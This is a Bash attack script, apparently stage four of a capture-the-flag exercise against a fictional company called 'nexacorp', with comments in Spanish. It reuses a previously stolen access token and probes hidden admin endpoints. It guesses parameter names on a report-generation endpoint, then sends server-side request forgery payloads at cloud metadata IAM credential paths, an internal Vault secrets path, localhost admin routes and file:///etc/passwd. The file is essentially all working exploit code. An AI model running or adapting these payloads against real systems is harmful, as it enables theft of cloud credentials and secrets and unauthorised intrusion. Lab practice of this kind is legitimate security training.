#!/usr/bin/env bash
# Stage 4 — SSRF
# Pista: "El servidor trae algo interno en su nombre"
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWT_FILE="${LOOT_DIR}/stage2_access_token.jwt"
JWT=$(cat "${JWT_FILE}")

OUT="${LOOT_DIR}/stage4_results.txt"
: > "${OUT}"

probe_rest() {
  local method="$1" ep="$2" body="${3:-}" label="${4:-}"
  local code resp
  if [[ -n "${body}" ]]; then
    code=$(curl -s -o /tmp/_b -w '%{http_code}' -X "${method}" "${API_URL}${ep}" \
      -H "Authorization: Bearer ${JWT}" \
      -H "Content-Type: application/json" \
      -d "${body}")
  else
    code=$(curl -s -o /tmp/_b -w '%{http_code}' -X "${method}" "${API_URL}${ep}" \
      -H "Authorization: Bearer ${JWT}")
  fi
  if [[ "${code}" != "404" && "${code}" != "000" ]]; then
    echo "[${method} ${code} ${label}] ${ep}" | tee -a "${OUT}"
    echo "    body: ${body:0:120}" | tee -a "${OUT}"
    head -c 600 /tmp/_b | tee -a "${OUT}"
    echo | tee -a "${OUT}"
    echo "---" | tee -a "${OUT}"
  fi
}

echo "##############################################"
echo "# A) Verificar privilegios actuales (post-Stage 3)"
echo "##############################################"
curl -s -X POST "${GQL_URL}" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ${JWT}" \
  -d '{"query":"{ me { id email role permissions } internalLogs vaultSecrets { id key value classification accessLevel } debugInfo { flag } }"}' | jq

echo
echo "##############################################"
echo "# B) /admin — endpoint revelado en Stage 3"
echo "##############################################"
for ep in /admin /admin/ /admin/dashboard /admin/users /admin/reports /admin/audit /admin/secrets /admin/vault /admin/proxy /admin/fetch; do
  for method in GET POST; do
    probe_rest "${method}" "${ep}"
  done
done

echo
echo "##############################################"
echo "# C) /api/v2/reports/generate — descubrir parámetros (sin body, con bodies vacíos)"
echo "##############################################"

# Sin body
probe_rest POST /api/v2/reports/generate '{}'
# Bodies que típicamente piden una URL
for key in url target source reportUrl link href callback webhook fetchUrl reportSource externalUrl src input; do
  probe_rest POST /api/v2/reports/generate "{\"${key}\":\"http://example.com\"}"
done

echo
echo "##############################################"
echo "# D) Si encontramos el param correcto, atacar SSRF"
echo "##############################################"

# Asume que se descubrió el param correcto (revisa output anterior).
# Lo más común: url o source. Probamos ambos contra targets internos.

SSRF_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role"
  "http://internal-vault.nexacorp.local:8200/"
  "http://internal-vault.nexacorp.local:8200/v1/sys/health"
  "http://internal-vault.nexacorp.local:8200/v1/sys/seal-status"
  "http://internal-vault.nexacorp.local:8200/v1/sys/mounts"
  "http://internal-vault.nexacorp.local:8200/v1/secret/data/critical"
  "http://localhost:8090/api/v2/admin"
  "http://127.0.0.1:8090/api/v2/admin"
  "file:///etc/passwd"
  "file:///etc/hostname"
  "http://localhost:22"
)

for target in "${SSRF_TARGETS[@]}"; do
  for key in url target source reportUrl link href; do
    echo "--- key=${key} target=${target} ---"
    curl -s -X POST "${API_URL}/api/v2/reports/generate" \
      -H "Authorization: Bearer ${JWT}" \
      -H "Content-Type: application/json" \
      -d "{\"${key}\":\"${target}\"}" \
      -w '\n[%{http_code}]\n' | head -c 800
    echo
  done
done

echo
echo "##############################################"
echo "# E) Variantes de format (a veces el endpoint quiere format=json/pdf y url separada)"
echo "##############################################"
for body in \
  '{"url":"http://169.254.169.254/latest/meta-data/","format":"json"}' \
  '{"url":"http://169.254.169.254/latest/meta-data/","format":"pdf"}' \
  '{"url":"http://169.254.169.254/latest/meta-data/","type":"external"}' \
  '{"source":"http://internal-vault.nexacorp.local:8200/v1/sys/health","format":"json"}' \
  '{"reportSource":"http://169.254.169.254/latest/meta-data/iam/security-credentials/nexacorp-prod-role"}' \
  '{"data":{"url":"http://169.254.169.254/latest/meta-data/"}}' \
  '{"options":{"sourceUrl":"http://169.254.169.254/latest/meta-data/"}}'; do
  echo "--- ${body:0:100} ---"
  curl -s -X POST "${API_URL}/api/v2/reports/generate" \
    -H "Authorization: Bearer ${JWT}" \
    -H "Content-Type: application/json" \
    -d "${body}" -w '\n[%{http_code}]\n' | head -c 800
  echo
done

echo
echo "##############################################"
echo "# F) Otros endpoints que pueden hacer fetch externo"
echo "##############################################"

for ep in \
  /api/v2/proxy \
  /api/v2/fetch \
  /api/v2/import \
  /api/v2/webhook \
  /api/v2/integrations/webhook \
  /api/v2/integrations/test \
  /api/v2/avatar/upload \
  /api/v2/users/me/avatar \
  /api/v2/reports/preview \
  /api/v2/reports/export \
  /api/v2/reports/from-url \
  /api/admin/proxy \
  /api/admin/fetch; do
  probe_rest GET "${ep}"
  probe_rest POST "${ep}" '{"url":"http://169.254.169.254/latest/meta-data/"}'
done

echo
echo "[+] Resultados completos en ${OUT}"
